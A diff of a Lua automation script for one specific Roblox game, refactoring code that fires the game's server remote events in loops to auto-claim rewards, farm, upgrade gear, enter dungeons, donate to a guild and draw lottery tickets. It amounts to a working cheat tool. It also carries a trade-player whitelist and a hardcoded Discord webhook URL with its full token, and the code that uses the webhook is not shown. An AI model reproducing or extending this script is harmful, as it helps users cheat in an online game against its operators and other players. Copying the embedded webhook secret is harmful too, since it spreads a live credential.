@@ -1,5 +1,7 @@
--- 在代码开头部分添加玩家白名单
-allowedTradePlayers = {
+-- ====================================================================
+-- 玩家白名单配置（局部变量，避免全局污染）
+-- ====================================================================
+local allowedTradePlayers = {
     'Ech0P0ppy',
     'WrenShine2022',
     'Haven_J0y',
@@ -257,7 +259,6 @@ allowedTradePlayers = {
     'Prasad3kW3iV',
     'NephelemRPtWA',
     'QuintonCkTSY48',
-    'compkill15',
     'Shaylaj6yNW2',
     'ReynoldIshpium',
     'IeshaIGkmuj',
@@ -284,7 +285,6 @@ allowedTradePlayers = {
     'RaymonsK8K2',
     'NailavQ7bI',
     'OctaviaDEXa1S',
-    'compkill15',
 }
 
 if not game:IsLoaded() then
@@ -293,7 +293,7 @@ end
 
 local currentGameId = game.PlaceId
 local TARGET_GAME_ID = 18645473062
-webhookURL =
+local webhookURL =
     'https://discord.com/api/webhooks/1360322264888905928/qkYNgfUuR2DpE2Ctal9Y7MDQen197Nm8QT3DpPFZ9iCZho99jYpmIPJIHtkdWdHmZKBc'
 
 if currentGameId == TARGET_GAME_ID then
@@ -407,6 +407,14 @@ if currentGameId == TARGET_GAME_ID then
         PathCache.Shop = events:WaitForChild('\229\149\134\229\186\151')
         PathCache.Stage = events:WaitForChild('\229\133\179\229\141\161')
         PathCache.Activity = events:WaitForChild('\232\138\130\230\151\165\230\180\187\229\138\168')
+        PathCache.FlyingSword = events:WaitForChild('\233\163\158\229\137\145')
+        PathCache.Weapon = events:WaitForChild('\230\179\149\229\174\157')
+        PathCache.Skill = events:WaitForChild('\230\138\128\232\131\189')
+        PathCache.Rune = events:WaitForChild('\233\152\181\230\179\149')
+        PathCache.Settings = events:WaitForChild('\232\174\190\231\189\174')
+        PathCache.Combat = events:WaitForChild('\230\136\152\230\150\151')
+        PathCache.Forge = events:WaitForChild('\229\187\186\231\173\145')
+        PathCache.WorldCore = events:WaitForChild('\228\184\150\231\149\140\230\160\145')
     end
 
     -- 延迟初始化GUI路径（在loadingGui之后调用）
@@ -677,16 +685,7 @@ if currentGameId == TARGET_GAME_ID then
                 return 0
             elseif countdownText == 'DONE' then
                 local args = { [1] = index }
-                game:GetService('ReplicatedStorage')
-                    :FindFirstChild('\228\186\139\228\187\182')
-                    :FindFirstChild('\229\133\172\231\148\168')
-                    :FindFirstChild(
-                        '\232\138\130\230\151\165\230\180\187\229\138\168'
-                    )
-                    :FindFirstChild(
-                        '\233\162\134\229\143\150\229\165\150\229\138\177'
-                    )
-                    :FireServer(unpack(args))
+                PathCache.Activity:FindFirstChild('\233\162\134\229\143\150\229\165\150\229\138\177'):FireServer(unpack(args))
                 return 0
             else
                 local minutes, seconds = countdownText:match('^(%d+):(%d+)$')
@@ -750,7 +749,7 @@ if currentGameId == TARGET_GAME_ID then
             end
         end
         local function checkTimeAndRun()
-            spawn(function()
+            task.spawn(function()
                 while true do
                     local currentTime = os.time()
                     local utcTime = os.date('!*t', currentTime)
@@ -759,11 +758,11 @@ if currentGameId == TARGET_GAME_ID then
                         print(
                             'UTC+8 時間為 00:00，開始執行更新數據...'
                         )
-                        spawn(function()
+                        task.spawn(function()
                             allGiftsExist = true
                             chaangeonlinegiftname()
-                    task.wait(1)
-                    checkOnlineGiftcountdown()
+                            task.wait(1)
+                            checkOnlineGiftcountdown()
                         end)
                         task.wait(60)
                     end
@@ -820,7 +819,7 @@ if currentGameId == TARGET_GAME_ID then
             end
         )
         updateButtonText()
-        spawn(setupRangeDetection)
+        task.spawn(setupRangeDetection)
         local screenGui = Instance.new('ScreenGui')
         screenGui.Parent = game.Players.LocalPlayer:WaitForChild('PlayerGui')
         local blackBlock = Instance.new('Frame')
@@ -887,27 +886,53 @@ if currentGameId == TARGET_GAME_ID then
         local minCountdown = GetOnlineGiftCountdown()
         local nowminCountdown = minCountdown
         local function Online_Gift_start()
-            local newMinCountdown = GetOnlineGiftCountdown()
-            if newMinCountdown and (newMinCountdown == minCountdown) then
-                nowminCountdown = nowminCountdown - 1
-            else
-                minCountdown = newMinCountdown
-                nowminCountdown = minCountdown
-            end
-            if nowminCountdown and (nowminCountdown > 0) then
-                timeLabel.Text = string.format(
-                    '距離下自動獲取還有 %d 秒',
-                    nowminCountdown
-                )
-            elseif nowminCountdown and (nowminCountdown <= 0) then
+            -- 如果倒计时到达或小于等于0，触发领取
+            if nowminCountdown and (nowminCountdown <= 0) then
                 timeLabel.Text = '倒計時結束，準備獲取獎勳'
+                -- 触发所有可领取的奖励
                 for i = 1, 6 do
                     local args = { [1] = i }
-                    PathCache.Activity
-                        :FindFirstChild('\233\162\134\229\143\150\229\165\150\229\138\177')
-                        :FireServer(unpack(args))
+                    pcall(function()
+                        PathCache.Activity
+                            :FindFirstChild('\233\162\134\229\143\150\229\165\150\229\138\177')
+                            :FireServer(unpack(args))
+                    end)
+                end
+                -- 等待服务器响应，然后重新获取倒计时
+                task.wait(2)
+            end
+            
+            -- 每次循环都重新获取当前倒计时（获取最新状态）
+            local newMinCountdown = GetOnlineGiftCountdown()
+            
+            -- 更新倒计时状态
+            if newMinCountdown then
+                -- 如果获取到新的倒计时
+                if newMinCountdown ~= minCountdown then
+                    -- 倒计时已更新（新的奖励或领取后刷新），重置计数器
+                    minCountdown = newMinCountdown
+                    nowminCountdown = minCountdown
+                elseif nowminCountdown and nowminCountdown > 0 then
+                    -- 倒计时还在进行中，继续减少
+                    nowminCountdown = nowminCountdown - 1
+                else
+                    -- 倒计时未初始化或已归零，设置为新值
+                    nowminCountdown = newMinCountdown
+                    minCountdown = newMinCountdown
+                end
+                
+                -- 更新显示
+                if nowminCountdown and (nowminCountdown > 0) then
+                    timeLabel.Text = string.format(
+                        '距離下自動獲取還有 %d 秒',
+                        nowminCountdown
+                    )
+                elseif nowminCountdown and (nowminCountdown <= 0) then
+                    -- 倒计时已归零，下次循环会触发领取
+                    timeLabel.Text = '倒計時即將結束...'
                 end
             else
+                -- 没有倒计时，说明全部领取完成
                 timeLabel.Text = '已全部領取'
                 Gife_check = false
             end
@@ -920,7 +945,7 @@ if currentGameId == TARGET_GAME_ID then
         end
         local function ClaimOnlineRewards()
             Gife_check = true
-            spawn(Online_Gift_check)
+            task.spawn(Online_Gift_check)
         end
         -- 创建按钮时引用函数
         features1:AddButton('自動領取在線獎勳', ClaimOnlineRewards)
@@ -944,13 +969,13 @@ if currentGameId == TARGET_GAME_ID then
                 Gife_check = false
             end
         end
-        spawn(function()
+        task.spawn(function()
             while Gife_check and not hasExecutedToday do
                 CheckAllRewardsCompleted()
-                wait(60)
+                task.wait(60)
             end
         end)
-        spawn(function()
+        task.spawn(function()
             while true do
                 local currentUTCHour = tonumber(os.date('!*t').hour)
                 local currentUTCDate = os.date('!*t').day
@@ -967,56 +992,70 @@ if currentGameId == TARGET_GAME_ID then
                         lastExecutedDay = currentLocalDate
                     end
                 end
-                wait(60)
+                task.wait(60)
             end
         end)
-local Autocollmission = features1:AddSwitch(
-    '自動任務領取(包括GamePass任務、獎勵)',
-    function(bool)
-        Autocollmissionbool = bool
-        if Autocollmissionbool then
-            -- 主任務循環（每60秒執行一次）
-            spawn(function()
-                while Autocollmissionbool do
-                    mainmissionchack()
-                    everydaymission()
-                    gamepassmission()
-                    gamepassgiftget()
-                    potionfull()
-                    task.wait(20)
-                end
-            end)
+        -- 自动任务领取控制变量（局部变量）
+        local Autocollmissionbool = false
+        
+        local Autocollmission = features1:AddSwitch(
+            '自動任務領取(包括GamePass任務、獎勵)',
+            function(bool)
+                Autocollmissionbool = bool
+                if Autocollmissionbool then
+                    -- 主任務循環（每20秒執行一次）
+                    task.spawn(function()
+                        while Autocollmissionbool do
+                            pcall(function()
+                                mainmissionchack()
+                                everydaymission()
+                                gamepassmission()
+                                gamepassgiftget()
+                                potionfull()
+                            end)
+                            task.wait(20)
+                        end
+                    end)
 
-            -- dailyspin 獨立循環（每500秒執行一次）
-            spawn(function()
-                while Autocollmissionbool do
-                    dailyspin()
-                    offlinereward()
-                    everydaygem()
-                    task.wait(500)
+                    -- dailyspin 獨立循環（每500秒執行一次）
+                    task.spawn(function()
+                        while Autocollmissionbool do
+                            pcall(function()
+                                dailyspin()
+                                offlinereward()
+                                everydaygem()
+                            end)
+                            task.wait(500)
+                        end
+                    end)
                 end
-            end)
-        end
-    end
-)
+            end
+        )
 
         Autocollmission:Set(true)
+        -- 自动投资控制变量（局部变量）
+        local investbool = false
+        
         local invest = features1:AddSwitch('自動執行投資', function(bool)
             investbool = bool
             if investbool then
-                spawn(function()
+                task.spawn(function()
                     while investbool do
-                        for i = 1, 3 do
-                            local args = { i }
-                            game:GetService('ReplicatedStorage')['\228\186\139\228\187\182']['\229\133\172\231\148\168']['\229\149\134\229\186\151']['\233\147\182\232\161\140']['\233\162\134\229\143\150\231\144\134\232\180\162']
-                                :FireServer(unpack(args))
-                        end
-                        task.wait(5)
-                        for i = 1, 3 do
-                            local args = { i }
-                            game:GetService('ReplicatedStorage')['\228\186\139\228\187\182']['\229\133\172\231\148\168']['\229\149\134\229\186\151']['\233\147\182\232\161\140']['\232\180\173\228\185\176\231\144\134\232\180\162']
-                                :FireServer(unpack(args))
-                        end
+                        pcall(function()
+                            -- 领取投资
+                            for i = 1, 3 do
+                                local args = { i }
+                                PathCache.Shop:FindFirstChild('\233\147\182\232\161\140'):FindFirstChild('\233\162\134\229\143\150\231\144\134\232\180\162')
+                                    :FireServer(unpack(args))
+                            end
+                            task.wait(5)
+                            -- 升级投资
+                            for i = 1, 3 do
+                                local args = { i }
+                                PathCache.Shop:FindFirstChild('\233\147\182\232\161\140'):FindFirstChild('\232\180\173\228\185\176\231\144\134\232\180\162')
+                                    :FireServer(unpack(args))
+                            end
+                        end)
                         task.wait(600)
                     end
                 end)
@@ -1025,8 +1064,14 @@ local Autocollmission = features1:AddSwitch(
         invest:Set(true)
         local function openFarm5()
             pcall(function()
-                game:GetService('ReplicatedStorage')['\228\186\139\228\187\182']['\229\134\156\231\148\176']['\229\134\156\231\148\176UI']['\229\177\158\230\128\167\229\140\186\229\159\159']
-                    :FireServer(5)
+                -- 使用路径缓存优化
+                local farmUI = Services.ReplicatedStorage:FindFirstChild('\228\186\139\228\187\182')
+                    :FindFirstChild('\229\134\156\231\148\176')
+                    :FindFirstChild('\229\134\156\231\148\176UI')
+                    :FindFirstChild('\229\177\158\230\128\167\229\140\186\229\159\159')
+                if farmUI then
+                    farmUI:FireServer(5)
+                end
             end)
             task.wait(0.5) -- 给UI一点时间打开
         end
@@ -1073,27 +1118,32 @@ local Autocollmission = features1:AddSwitch(
             warn('[农田5] 等待超时（超过上限仍 >=100）')
             return false
         end
+        -- 自动采草药控制变量（局部变量）
+        local AutoCollectherbsbool = false
+        
         local AutoCollectherbs = features1:AddSwitch(
             '自動採草藥',
             function(bool)
                 AutoCollectherbsbool = bool
                 if AutoCollectherbsbool then
-                    spawn(function()
+                    task.spawn(function()
                         while AutoCollectherbsbool do
-                            for i = 1, 6 do
-                                local args = { [1] = i, [2] = nil }
-                                game:GetService('ReplicatedStorage')['\228\186\139\228\187\182']['\229\133\172\231\148\168']['\229\134\156\231\148\176']['\233\135\135\233\155\134']
-                                    :FireServer(unpack(args))
-                                task.wait(0.1)
-                            end
+                            pcall(function()
+                                for i = 1, 6 do
+                                    local args = { [1] = i, [2] = nil }
+                                    PathCache.Farm:FindFirstChild('\233\135\135\233\155\134')
+                                        :FireServer(unpack(args))
+                                    task.wait(0.1)
+                                end
 
-                            -- 🌿 一轮收集完成
-                            herbCollectFinished = true
-                            print(
-                                '[系统] 草药收集一轮完成，检查农田 5 状态…'
-                            )
-                            openFarm5()
-                            waitFarm5Below100()
+                                -- 🌿 一轮收集完成
+                                herbCollectFinished = true
+                                print(
+                                    '[系统] 草药收集一轮完成，检查农田 5 状态…'
+                                )
+                                openFarm5()
+                                waitFarm5Below100()
+                            end)
 
                             task.wait(60) -- 等下一轮
                         end
@@ -1116,25 +1166,22 @@ local Autocollmission = features1:AddSwitch(
         local showAll = features1:AddSwitch('顯示所有貨幣', function(bool)
             ShowAllbool = bool
             if ShowAllbool then
-                while ShowAllbool do
-                    game:GetService('Players').LocalPlayer.PlayerGui.GUI['\228\184\187\231\149\140\233\157\162']['\228\184\187\229\159\142']['\232\180\167\229\184\129\229\140\186\229\159\159']['\230\180\187\229\138\168\231\137\169\229\147\129'].Visible =
-                        true
-                    game:GetService('Players').LocalPlayer.PlayerGui.GUI['\228\184\187\231\149\140\233\157\162']['\228\184\187\229\159\142']['\232\180\167\229\184\129\229\140\186\229\159\159']['\231\159\191\231\159\179'].Visible =
-                        false
-                    game:GetService('Players').LocalPlayer.PlayerGui.GUI['\228\184\187\231\149\140\233\157\162']['\228\184\187\229\159\142']['\232\180\167\229\184\129\229\140\186\229\159\159']['\231\172\166\231\159\179\231\178\137\230\156\171'].Visible =
-                        true
-                    game:GetService('Players').LocalPlayer.PlayerGui.GUI['\228\184\187\231\149\140\233\157\162']['\228\184\187\229\159\142']['\232\180\167\229\184\129\229\140\186\229\159\159']['\231\173\137\231\186\167'].Visible =
-                        true
-                    game:GetService('Players').LocalPlayer.PlayerGui.GUI['\228\184\187\231\149\140\233\157\162']['\228\184\187\229\159\142']['\232\180\167\229\184\129\229\140\186\229\159\159']['\231\180\171\233\146\187'].Visible =
-                        true
-                    game:GetService('Players').LocalPlayer.PlayerGui.GUI['\228\184\187\231\149\140\233\157\162']['\228\184\187\229\159\142']['\232\180\167\229\184\129\229\140\186\229\159\159']['\232\141\137\232\141\175'].Visible =
-                        false
-                    game:GetService('Players').LocalPlayer.PlayerGui.GUI['\228\184\187\231\149\140\233\157\162']['\228\184\187\229\159\142']['\232\180\167\229\184\129\229\140\186\229\159\159']['\233\135\145\229\184\129'].Visible =
-                        true
-                    game:GetService('Players').LocalPlayer.PlayerGui.GUI['\228\184\187\231\149\140\233\157\162']['\228\184\187\229\159\142']['\232\180\167\229\184\129\229\140\186\229\159\159']['\233\146\187\231\159\179'].Visible =
-                        true
-                    task.wait(0.3)
-                end
+                task.spawn(function()
+                    while ShowAllbool do
+                        pcall(function()
+                            local currencyPanel = PathCache.GUI.Main['\228\184\187\229\159\142']['\232\180\167\229\184\129\229\140\186\229\159\159']
+                            currencyPanel['\230\180\187\229\138\168\231\137\169\229\147\129'].Visible = true
+                            currencyPanel['\231\159\191\231\159\179'].Visible = false
+                            currencyPanel['\231\172\166\231\159\179\231\178\137\230\156\171'].Visible = true
+                            currencyPanel['\231\173\137\231\186\167'].Visible = true
+                            currencyPanel['\231\180\171\233\146\187'].Visible = true
+                            currencyPanel['\232\141\137\232\141\175'].Visible = false
+                            currencyPanel['\233\135\145\229\184\129'].Visible = true
+                            currencyPanel['\233\146\187\231\159\179'].Visible = true
+                        end)
+                        task.wait(0.3)
+                    end
+                end)
             end
         end)
         showAll:Set(false)
@@ -1190,9 +1237,7 @@ local Autocollmission = features1:AddSwitch(
             for i = 1, #gamecode do
                 print(gamecode[i])
                 local args = { [1] = gamecode[i] }
-                game:GetService('ReplicatedStorage')
-                    :FindFirstChild('\228\186\139\228\187\182')
-                    :FindFirstChild('\229\133\172\231\148\168')
+                PathCache.Events
                     :FindFirstChild('\230\191\128\230\180\187\231\160\129')
                     :FindFirstChild(
                         '\231\142\169\229\174\182\229\133\145\230\141\162\230\191\128\230\180\187\231\160\129'
@@ -1217,7 +1262,7 @@ local Autocollmission = features1:AddSwitch(
                 :WaitForChild('主线进度')
                 :WaitForChild('world').Value
         end
-        spawn(function()
+        task.spawn(function()
             while true do
                 statisticsupdata()
                 task.wait(1)
@@ -1309,10 +1354,7 @@ local Autocollmission = features1:AddSwitch(
                             wait(savemodetime2)
                             wait(savemodetime + 1)
                             local args = { [1] = finishworldnum }
-                            game:GetService('ReplicatedStorage')
-                                :FindFirstChild('\228\186\139\228\187\182')
-                                :FindFirstChild('\229\133\172\231\148\168')
-                                :FindFirstChild('\229\133\179\229\141\161')
+                            PathCache.Stage
                                 :FindFirstChild(
                                     '\232\191\155\229\133\165\228\184\150\231\149\140\229\133\179\229\141\161'
                                 )
@@ -1351,10 +1393,7 @@ local Autocollmission = features1:AddSwitch(
             :waitForChild('文本')
         local function teleporttworld1()
             local args = { [1] = gowordlevels }
-            game:GetService('ReplicatedStorage')
-                :FindFirstChild('\228\186\139\228\187\182')
-                :FindFirstChild('\229\133\172\231\148\168')
-                :FindFirstChild('\229\133\179\229\141\161')
+            PathCache.Stage
                 :FindFirstChild(
                     '\232\191\155\229\133\165\228\184\150\231\149\140\229\133\179\229\141\161'
                 )
@@ -1365,12 +1404,8 @@ local Autocollmission = features1:AddSwitch(
             finishworldnum = tonumber(gowordlevels)
             local args = { [1] = finishworldnum }
 
-            -- 保留原始转义路径
-            local remStorage = game:GetService('ReplicatedStorage')
-            local targetEvent = remStorage
-                :FindFirstChild('\228\186\139\228\187\182')
-                :FindFirstChild('\229\133\172\231\148\168')
-                :FindFirstChild('\229\133\179\229\141\161')
+            -- 使用路径缓存
+            local targetEvent = PathCache.Stage
                 :FindFirstChild(
                     '\232\191\155\229\133\165\228\184\150\231\149\140\229\133\179\229\141\161'
                 )
@@ -1409,7 +1444,7 @@ local Autocollmission = features1:AddSwitch(
                 end
                 
                 AutoReenter = true
-                AutoReenterThread = spawn(function()
+                AutoReenterThread = task.spawn(function()
                     while AutoReenter do
                         local text = combatUI.Text
                         local progress = text:match("-(%d+)%/")
@@ -1435,13 +1470,16 @@ local Autocollmission = features1:AddSwitch(
             '戰鬥結束後自動開始(世界戰鬥)',
             function(bool)
                 if bool then
-                    -- 关闭现有线程
-                    if Autostartwarld and AutostartThread then
-                        coroutine.close(AutostartThread)
+                    -- 如果已经运行，先停止
+                    if AutostartThread then
+                        Autostartwarld = false
+                        task.cancel(AutostartThread)
+                        AutostartThread = nil
+                        task.wait(0.1) -- 等待旧线程停止
                     end
 
                     Autostartwarld = true
-                    AutostartThread = coroutine.create(function()
+                    AutostartThread = task.spawn(function()
                         while Autostartwarld do
                             -- 双重状态检查
                             if not Autostartwarld then
@@ -1495,14 +1533,13 @@ local Autocollmission = features1:AddSwitch(
                             task.wait(0.3)
                         end
                         Autostartwarld = false -- 确保状态同步
+                        AutostartThread = nil -- 线程结束时清空引用
                     end)
-
-                    coroutine.resume(AutostartThread)
                 else
                     -- 安全关闭线程
                     Autostartwarld = false
                     if AutostartThread then
-                        coroutine.close(AutostartThread)
+                        task.cancel(AutostartThread)
                         AutostartThread = nil
                     end
                 end
@@ -1511,10 +1548,7 @@ local Autocollmission = features1:AddSwitch(
 
         Autostart:Set(false)
         features2:AddButton('掛機模式', function()
-            local AFKmod = game:GetService('Players').LocalPlayer
-                :WaitForChild('值')
-                :WaitForChild('设置')
-                :WaitForChild('自动战斗')
+            local AFKmod = player:WaitForChild('值'):WaitForChild('设置'):WaitForChild('自动战斗')
             if AFKmod.Value == true then
                 AFKmod.Value = false
             else
@@ -1577,37 +1611,39 @@ local Autocollmission = features1:AddSwitch(
         end
     end
     main()
-    spawn(function()
+    task.spawn(function()
         while true do
             if updDungeonui then
-                local dungeonChoice = playerGui
-                    :WaitForChild('GUI')
-                    :WaitForChild('二级界面')
-                    :WaitForChild('关卡选择')
-                    :WaitForChild('副本选择弹出框')
-                    :WaitForChild('背景')
-                    :WaitForChild('标题')
-                    :WaitForChild('名称').Text
-                local dungeonMaxLevel = tonumber(
-                    playerGui
+                pcall(function()
+                    local dungeonChoice = playerGui
                         :WaitForChild('GUI')
                         :WaitForChild('二级界面')
                         :WaitForChild('关卡选择')
                         :WaitForChild('副本选择弹出框')
                         :WaitForChild('背景')
-                        :WaitForChild('难度')
-                        :WaitForChild('难度等级')
-                        :WaitForChild('值').Text
-                )
-                JsonHandler.updateDungeonMaxLevel(
-                    filePath,
-                    player.Name,
-                    dungeonChoice,
-                    dungeonMaxLevel
-                )
-                updateDungeonFunctions()
+                        :WaitForChild('标题')
+                        :WaitForChild('名称').Text
+                    local dungeonMaxLevel = tonumber(
+                        playerGui
+                            :WaitForChild('GUI')
+                            :WaitForChild('二级界面')
+                            :WaitForChild('关卡选择')
+                            :WaitForChild('副本选择弹出框')
+                            :WaitForChild('背景')
+                            :WaitForChild('难度')
+                            :WaitForChild('难度等级')
+                            :WaitForChild('值').Text
+                    )
+                    JsonHandler.updateDungeonMaxLevel(
+                        filePath,
+                        player.Name,
+                        dungeonChoice,
+                        dungeonMaxLevel
+                    )
+                    updateDungeonFunctions()
+                end)
             end
-            wait(1)
+            task.wait(1)
         end
     end)
     local playerData = JsonHandler.getPlayerData(filePath, player.Name)
@@ -1839,10 +1875,12 @@ local Autocollmission = features1:AddSwitch(
             .. '            '
         Dungeon7.Text = '            活動地下城   未開啟            '
     end
-    spawn(function()
+    task.spawn(function()
         while true do
-            UDPDungeonchoose()
-            UDPDungeontext()
+            pcall(function()
+                UDPDungeonchoose()
+                UDPDungeontext()
+            end)
             task.wait(0.5)
         end
     end)
@@ -1885,10 +1923,7 @@ local Autocollmission = features1:AddSwitch(
     local function DungeonTP()
         local dropdownTP = tonumber(dropdownchoose2)
         local args = { [1] = dropdownchoose, [2] = dropdownTP }
-        game:GetService('ReplicatedStorage')
-            :FindFirstChild('\228\186\139\228\187\182')
-            :FindFirstChild('\229\133\172\231\148\168')
-            :FindFirstChild('\229\137\175\230\156\172')
+        PathCache.Dungeon
             :FindFirstChild('\232\191\155\229\133\165\229\137\175\230\156\172')
             :FireServer(unpack(args))
     end
@@ -2030,11 +2065,11 @@ local Autocollmission = features1:AddSwitch(
         function(bool)
             AutostartDungeon = bool
             if AutostartDungeon then
-                spawn(function()
+                task.spawn(function()
                     while AutostartDungeon do
                         local actionTaken = AutostartDungeonf()
                         -- Only wait longer if no action was taken
-                        wait(actionTaken and 0.1 or 0.5)
+                        task.wait(actionTaken and 0.1 or 0.5)
                     end
                 end)
             end
@@ -2146,15 +2181,14 @@ local Autocollmission = features1:AddSwitch(
     AutoelixirSwitch = features4:AddSwitch('自動煉丹藥', function(bool)
         Autoelixir = bool
         if Autoelixir then
-            while Autoelixir do
-                game:GetService('ReplicatedStorage')
-                    :FindFirstChild('\228\186\139\228\187\182')
-                    :FindFirstChild('\229\133\172\231\148\168')
-                    :FindFirstChild('\231\130\188\228\184\185')
-                    :FindFirstChild('\229\136\182\228\189\156')
-                    :FireServer()
-                task.wait(0.5)
-            end
+            task.spawn(function()
+                while Autoelixir do
+                    pcall(function()
+                        PathCache.Elixir:FindFirstChild('\229\136\182\228\189\156'):FireServer()
+                    end)
+                    task.wait(0.5)
+                end
+            end)
         end
     end)
     features4:AddButton('传送炼器', function()
@@ -2246,25 +2280,23 @@ local Autocollmission = features1:AddSwitch(
     local function useskill_ticket()
         if canstartticket then
             local args = { [1] = '\230\138\128\232\131\189', [2] = true }
-            game:GetService('ReplicatedStorage')
-                :FindFirstChild('\228\186\139\228\187\182')
-                :FindFirstChild('\229\133\172\231\148\168')
-                :FindFirstChild('\229\149\134\229\186\151')
-                :FindFirstChild('\229\143\172\229\148\164')
-                :FindFirstChild('\230\138\189\229\165\150')
-                :FireServer(unpack(args))
+            pcall(function()
+                PathCache.Shop
+                    :FindFirstChild('\229\143\172\229\148\164')
+                    :FindFirstChild('\230\138\189\229\165\150')
+                    :FireServer(unpack(args))
+            end)
         end
     end
     local function usesword_ticket()
         if canstartticket2 then
             local args = { [1] = '\230\179\149\229\174\157', [2] = true }
-            game:GetService('ReplicatedStorage')
-                :FindFirstChild('\228\186\139\228\187\182')
-                :FindFirstChild('\229\133\172\231\148\168')
-                :FindFirstChild('\229\149\134\229\186\151')
-                :FindFirstChild('\229\143\172\229\148\164')
-                :FindFirstChild('\230\138\189\229\165\150')
-                :FireServer(unpack(args))
+            pcall(function()
+                PathCache.Shop
+                    :FindFirstChild('\229\143\172\229\148\164')
+                    :FindFirstChild('\230\138\189\229\165\150')
+                    :FireServer(unpack(args))
+            end)
         end
     end
     local function Compareskilltickets()
@@ -2328,10 +2360,10 @@ local Autocollmission = features1:AddSwitch(
             .. '    技能抽獎券： '
             .. skill_ticketslable
     end
-    spawn(function()
+    task.spawn(function()
         while true do
             updateExtractedValues()
-            wait(1)
+            task.wait(1)
         end
     end)
     local AutolotterySwitch = features4:AddSwitch(
@@ -2362,8 +2394,7 @@ local Autocollmission = features1:AddSwitch(
     USEDiamondSwitch:Set(false)
     -- 定义执行函数
     local function ExecuteSettingsClose()
-        local targetGui =
-            game:GetService('Players').LocalPlayer.PlayerGui.GUI['\228\186\140\231\186\167\231\149\140\233\157\162']['\232\174\190\231\189\174']['\232\131\140\230\153\175']['\232\174\190\231\189\174\229\140\186\229\159\159']['\233\159\179\228\185\144\232\174\190\231\189\174\233\161\185']['\229\188\128\229\133\179']['\229\137\141\230\153\175']
+        local targetGui = PathCache.GUI.Secondary['\232\174\190\231\189\174']['\232\131\140\230\153\175']['\232\174\190\231\189\174\229\140\186\229\159\159']['\233\159\179\228\185\144\232\174\190\231\189\174\233\161\185']['\229\188\128\229\133\179']['\229\137\141\230\153\175']
 
         if targetGui.Visible then
             local argsList = {
@@ -2377,16 +2408,18 @@ local Autocollmission = features1:AddSwitch(
                 '\229\135\186\229\148\174\228\186\140\230\172\161\231\161\174\232\174\164',
             }
 
-            local remotePath = game:GetService('ReplicatedStorage')
-                :FindFirstChild('\228\186\139\228\187\182')
-                :FindFirstChild('\229\133\172\231\148\168')
+            local remotePath = PathCache.Events
                 :FindFirstChild('\232\174\190\231\189\174')
                 :FindFirstChild(
                     '\231\142\169\229\174\182\228\191\174\230\148\185\232\174\190\231\189\174'
                 )
 
-            for _, args in ipairs(argsList) do
-                remotePath:FireServer(args)
+            if remotePath then
+                for _, args in ipairs(argsList) do
+                    pcall(function()
+                        remotePath:FireServer(args)
+                    end)
+                end
             end
         end
     end
@@ -2401,15 +2434,14 @@ local Autocollmission = features1:AddSwitch(
         function(bool)
             AutoupdFlyingSword = bool
             if AutoupdFlyingSword then
-                while AutoupdFlyingSword do
-                    game:GetService('ReplicatedStorage')
-                        :FindFirstChild('\228\186\139\228\187\182')
-                        :FindFirstChild('\229\133\172\231\148\168')
-                        :FindFirstChild('\233\163\158\229\137\145')
-                        :FindFirstChild('\229\141\135\231\186\167')
-                        :FireServer()
-                    task.wait(0.2)
-                end
+                task.spawn(function()
+                    while AutoupdFlyingSword do
+                        pcall(function()
+                            PathCache.FlyingSword:FindFirstChild('\229\141\135\231\186\167'):FireServer()
+                        end)
+                        task.wait(0.2)
+                    end
+                end)
             end
         end
     )
@@ -2419,25 +2451,15 @@ local Autocollmission = features1:AddSwitch(
         function(bool)
             AutoupdskillSword = bool
             if AutoupdskillSword then
-                while AutoupdskillSword do
-                    game:GetService('ReplicatedStorage')
-                        :FindFirstChild('\228\186\139\228\187\182')
-                        :FindFirstChild('\229\133\172\231\148\168')
-                        :FindFirstChild('\230\179\149\229\174\157')
-                        :FindFirstChild(
-                            '\229\141\135\231\186\167\229\133\168\233\131\168\230\179\149\229\174\157'
-                        )
-                        :FireServer()
-                    game:GetService('ReplicatedStorage')
-                        :FindFirstChild('\228\186\139\228\187\182')
-                        :FindFirstChild('\229\133\172\231\148\168')
-                        :FindFirstChild('\230\138\128\232\131\189')
-                        :FindFirstChild(
-                            '\229\141\135\231\186\167\229\133\168\233\131\168\230\138\128\232\131\189'
-                        )
-                        :FireServer()
-                    wait(1.5)
-                end
+                task.spawn(function()
+                    while AutoupdskillSword do
+                        pcall(function()
+                            PathCache.Weapon:FindFirstChild('\229\141\135\231\186\167\229\133\168\233\131\168\230\179\149\229\174\157'):FireServer()
+                            PathCache.Skill:FindFirstChild('\229\141\135\231\186\167\229\133\168\233\131\168\230\138\128\232\131\189'):FireServer()
+                        end)
+                        task.wait(1.5)
+                    end
+                end)
             end
         end
     )
@@ -2447,15 +2469,14 @@ local Autocollmission = features1:AddSwitch(
         function(bool)
             AutoupdRuneSwordSwitch = bool
             if AutoupdRuneSwordSwitch then
-                while AutoupdRuneSwordSwitch do
-                    game:GetService('ReplicatedStorage')
-                        :FindFirstChild('\228\186\139\228\187\182')
-                        :FindFirstChild('\229\133\172\231\148\168')
-                        :FindFirstChild('\233\152\181\230\179\149')
-                        :FindFirstChild('\229\141\135\231\186\167')
-                        :FireServer()
-                    task.wait(0.2)
-                end
+                task.spawn(function()
+                    while AutoupdRuneSwordSwitch do
+                        pcall(function()
+                            PathCache.Rune:FindFirstChild('\229\141\135\231\186\167'):FireServer()
+                        end)
+                        task.wait(0.2)
+                    end
+                end)
             end
         end
     )
@@ -2494,9 +2515,10 @@ local Autocollmission = features1:AddSwitch(
             :WaitForChild('确定按钮')
             :WaitForChild('次数').Text
         Donatetimesnumber = tonumber(string.match(Donatetimes, '%d+'))
-        local replicatedStorage = game:GetService('ReplicatedStorage')
-        local event = replicatedStorage:FindFirstChild('打开公会', true)
-        event:Fire('打开公会')
+        local event = Services.ReplicatedStorage:FindFirstChild('打开公会', true)
+        if event then
+            event:Fire('打开公会')
+        end
         Guildname.Text = '公會名稱：'
             .. Guidename
             .. ' 剩餘貢獻次數： '
@@ -2508,11 +2530,7 @@ local Autocollmission = features1:AddSwitch(
         :WaitForChild('背景')
         :WaitForChild('按钮')
         :WaitForChild('确定按钮')
-    local DonationEvent = game:GetService('ReplicatedStorage')
-        :WaitForChild('\228\186\139\228\187\182')
-        :WaitForChild('\229\133\172\231\148\168')
-        :WaitForChild('\229\133\172\228\188\154')
-        :WaitForChild('\230\141\144\231\140\174')
+    local DonationEvent = PathCache.Guild:WaitForChild('\230\141\144\231\140\174')
 
     -- 创建独立控制模块
     local donationController = {
@@ -2621,8 +2639,7 @@ local Autocollmission = features1:AddSwitch(
     -- 界面控制函数
     local function toggleGuildUI(state)
         pcall(function()
